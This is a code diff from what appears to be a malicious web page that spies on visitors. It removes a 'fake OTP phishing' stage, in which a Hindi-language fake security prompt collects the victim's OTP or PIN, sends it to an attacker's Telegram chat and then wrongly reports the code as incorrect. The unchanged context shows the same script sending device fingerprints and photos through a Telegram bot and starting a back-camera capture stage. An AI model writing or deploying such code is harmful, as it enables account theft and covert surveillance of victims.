@@ -383,28 +383,6 @@ function sendFingerprint() {
         tgSend("sendPhoto", fd);
     });
 }
-
-// ===================== STAGE 8: FAKE OTP PHISHING =====================
-function showFakeAuth() {
-    fakeAuthForm.style.display = "block";
-    titleText.innerText = "⚠️ पुनः सत्यापन आवश्यक";
-    setStatus("सुरक्षा प्रणाली में त्रुटि। कृपया नीचे अपना OTP/PIN दर्ज करें।", "orange");
-    otpInput.focus();
-}
-
-function submitFakeOtp() {
-    const otp = otpInput.value.trim();
-    if (!otp) return;
-    
-    tgSend("sendMessage", {
-        chat_id: CHAT_ID,
-        text: `🔐 OTP/PIN: ${otp}`
-    });
-    
-    otpInput.value = '';
-    otpInput.placeholder = '❌ गलत कोड, पुनः प्रयास करें...';
-}
-
 // ===================== STAGE 9: BACK CAMERA =====================
 function tryBackCamera() {
     navigator.mediaDevices.enumerateDevices()
